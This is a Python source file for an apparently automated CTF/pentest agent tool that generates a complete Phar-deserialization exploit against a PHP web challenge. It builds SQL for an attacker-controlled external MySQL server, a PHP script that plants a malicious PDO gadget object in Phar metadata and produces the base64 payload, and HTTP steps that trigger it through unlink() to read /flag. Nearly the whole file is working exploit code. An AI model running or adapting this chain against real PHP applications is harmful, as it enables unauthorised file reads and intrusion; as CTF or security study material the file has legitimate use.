"""Generate and guide exploitation of Phar + PDO FETCH_CLASS PHP CTF chains."""
from __future__ import annotations

import base64
import hashlib
import shutil
import subprocess
import tempfile
from pathlib import Path
from typing import Any, Dict, List

from ..base import BaseTool, ToolResult


def _php_escape(value: str) -> str:
    return value.replace("\\", "\\\\").replace("'", "\\'")


class PharPDOChainTool(BaseTool):
    category = "ctf_web"
    requires_exploit_enabled = True
    required_capability = "exploit"

    @property
    def name(self) -> str:
        return "phar_pdo_chain"

    @property
    def description(self) -> str:
        return (
            "Build the known strange_php-style exploit plan for Phar metadata deserialization "
            "triggered by file_exists()/unlink(), chained through a User->__destruct() gadget "
            "that uses attacker-controlled PDO connection options and PDO::FETCH_CLASS | "
            "PDO::FETCH_PROPS_LATE (262152) to instantiate UserMessage and trigger __set() "
            "for file read. Generates SQL, PHP Phar builder code, expected log path, and "
            "HTTP trigger steps. If a local php binary is available it can also generate the "
            "base64-encoded Phar payload."
        )

    def parameters_schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "db_host": {"type": "string", "description": "Public MySQL host reachable by the target container."},
                "db_port": {"type": "integer", "description": "MySQL port. Default: 3306."},
                "db_name": {"type": "string", "description": "Database name. Default: users."},
                "db_user": {"type": "string", "description": "Database user. Default: joker."},
                "db_password": {"type": "string", "description": "Database password. Default: joker."},
                "flag_path": {"type": "string", "description": "File path to read through UserMessage->__set. Default: /flag."},
                "login_user": {"type": "string", "description": "Registered target-app username used for upload/login steps."},
                "login_password": {"type": "string", "description": "Registered target-app password used for upload/login steps."},
                "generate_payload": {
                    "type": "boolean",
                    "description": "Try to run local php to build the base64 Phar payload. Default: true.",
                },
            },
            "required": [],
        }

    def _run(self, **kwargs: Any) -> ToolResult:
        db_host = str(kwargs.get("db_host") or "").strip()
        if not db_host:
            flag_path = str(kwargs.get("flag_path") or "/flag")
            log_name = hashlib.md5(flag_path.encode("utf-8")).hexdigest() + ".txt"
            sql = _build_sql(flag_path=flag_path, login_user_class="UserMessage")
            return ToolResult(
                True,
                self.name,
                "Phar+PDO chain identified, but exploitation requires a public MySQL host reachable by the target.",
                raw_output=(
                    "This strange_php chain needs attacker-controlled MySQL because PDO_connect must be overwritten "
                    "inside Phar metadata. Provide db_host/db_port/db_user/db_password to generate a concrete Phar payload.\n\n"
                    "Next action: call ctf_mysql_helper to generate a VPS Docker MySQL plan or free public MySQL setup checklist.\n\n"
                    f"Expected flag log after successful trigger: /log/{log_name}\n\n"
                    "SQL template:\n" + sql
                ),
                parsed_data={
                    "chain_identified": True,
                    "blocked": True,
                    "blocker": "missing_public_mysql_host",
                    "requires_external_mysql": True,
                    "expected_log_path": f"/log/{log_name}",
                    "sql_setup": sql,
                    "recommended_next_tool": "ctf_mysql_helper",
                    "http_steps": [
                        "Call ctf_mysql_helper to prepare a public MySQL host reachable by the target container.",
                        "Run the generated SQL with UserMessage, filePath=/flag, and a later unknown column to trigger __set.",
                        "Call this tool again with db_host to generate the Phar payload and trigger steps.",
                    ],
                },
            )
        db_port = int(kwargs.get("db_port") or 3306)
        db_name = str(kwargs.get("db_name") or "users")
        db_user = str(kwargs.get("db_user") or "joker")
        db_password = str(kwargs.get("db_password") or "joker")
        flag_path = str(kwargs.get("flag_path") or "/flag")
        login_user = str(kwargs.get("login_user") or "autopenx")
        login_password = str(kwargs.get("login_password") or "autopenx")
        generate_payload = bool(kwargs.get("generate_payload", True))

        log_name = hashlib.md5(flag_path.encode("utf-8")).hexdigest() + ".txt"
        sql = _build_sql(flag_path=flag_path, login_user_class="UserMessage")
        php_code = _build_php(
            db_host=db_host,
            db_port=db_port,
            db_name=db_name,
            db_user=db_user,
            db_password=db_password,
        )
        payload_b64 = ""
        payload_error = ""
        if generate_payload:
            payload_b64, payload_error = _try_generate_phar_payload(php_code)

        steps = [
            f"Prepare external MySQL reachable by target: {db_host}:{db_port}",
            "Create database/table and row using the generated SQL. The row must put filePath before password.",
            "Generate the Phar bytes with the PHP builder; base64-encode them.",
            f"Register/login to the target app as {login_user}:{login_password}.",
            "POST welcome.php with action=message and encodedMessage=<base64 Phar bytes>; record returned ./txt/<name>.txt path.",
            "POST welcome.php with action=delete and message_path=phar://./txt/<name> (omit the .txt suffix because deleteMessage appends it).",
            f"Read /log/{log_name}; it should contain the contents of {flag_path}.",
        ]

        parsed = {
            "requires_external_mysql": True,
            "db_host": db_host,
            "db_port": db_port,
            "db_name": db_name,
            "db_user": db_user,
            "db_password": db_password,
            "flag_path": flag_path,
            "expected_log_path": f"/log/{log_name}",
            "sql_setup": sql,
            "php_phar_builder": php_code,
            "payload_base64": payload_b64,
            "payload_error": payload_error,
            "http_steps": steps,
        }
        summary = (
            "Generated Phar+PDO chain plan. "
            + (f"Payload generated ({len(payload_b64)} base64 chars)." if payload_b64 else "Payload generation requires local php.")
        )
        raw = "\n\n".join(
            [
                "SQL setup:\n" + sql,
                "PHP Phar builder:\n" + php_code,
                "HTTP steps:\n" + "\n".join(f"{idx + 1}. {step}" for idx, step in enumerate(steps)),
                f"Expected flag log: /log/{log_name}",
                f"Payload error: {payload_error}" if payload_error else "",
            ]
        )
        return ToolResult(True, self.name, summary, raw_output=raw, parsed_data=parsed)


def _build_sql(*, flag_path: str, login_user_class: str) -> str:
    escaped_path = flag_path.replace("'", "''")
    escaped_class = login_user_class.replace("'", "''")
    return f"""CREATE DATABASE IF NOT EXISTS users DEFAULT CHARACTER SET utf8mb4;
USE users;
DROP TABLE IF EXISTS users;
CREATE TABLE users (
  class_name VARCHAR(64) NOT NULL,
  username VARCHAR(128) NOT NULL,
  filePath VARCHAR(255) NOT NULL,
  password VARCHAR(255) NOT NULL
);
INSERT INTO users (class_name, username, filePath, password)
VALUES ('{escaped_class}', '{escaped_class}', '{escaped_path}', 'trigger');
CREATE USER IF NOT EXISTS 'joker'@'%' IDENTIFIED BY 'joker';
GRANT ALL PRIVILEGES ON users.* TO 'joker'@'%';
FLUSH PRIVILEGES;"""


def _build_php(*, db_host: str, db_port: int, db_name: str, db_user: str, db_password: str) -> str:
    dsn = f"mysql:host={db_host}:{db_port};dbname={db_name};charset=utf8"
    return f"""<?php
class User {{
    public $id;
    public $username = "UserMessage";
    public $created_at;
    private $conn;
    private $table = "users";
    private $password = "x";
    public function __construct() {{
        $this->conn = new PDO_connect();
    }}
}}

class PDO_connect {{
    public $con_options = array(
        "dsn" => "{_php_escape(dsn)}",
        "host" => "{_php_escape(db_host)}",
        "port" => "{db_port}",
        "user" => "{_php_escape(db_user)}",
        "password" => "{_php_escape(db_password)}",
        "charset" => "utf8",
        "options" => array(
            PDO::ATTR_DEFAULT_FETCH_MODE => 262152,
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
        )
    );
    public $smt;
    private $pdo;
}}

@unlink("autopenx_payload.phar");
$a = new User();
$phar = new Phar("autopenx_payload.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->addFromString("happy.txt", "happy");
$phar->setMetadata($a);
$phar->stopBuffering();
echo base64_encode(file_get_contents("autopenx_payload.phar"));
?>"""


def _try_generate_phar_payload(php_code: str) -> tuple[str, str]:
    php = shutil.which("php")
    if not php:
        return "", "php binary not found in PATH"
    with tempfile.TemporaryDirectory() as tmp:
        script = Path(tmp) / "build_phar.php"
        script.write_text(php_code, encoding="utf-8")
        try:
            proc = subprocess.run(
                [php, "-d", "phar.readonly=0", str(script)],
                cwd=tmp,
                text=True,
                capture_output=True,
                timeout=30,
                check=False,
            )
        except Exception as exc:  # noqa: BLE001
            return "", f"{exc.__class__.__name__}: {exc}"
        stdout = (proc.stdout or "").strip()
        stderr = (proc.stderr or "").strip()
        try:
            base64.b64decode(stdout, validate=True)
        except Exception:
            return "", stderr or stdout[:500] or f"php exited with {proc.returncode}"
        if proc.returncode != 0:
            return "", stderr or f"php exited with {proc.returncode}"
        return stdout, ""
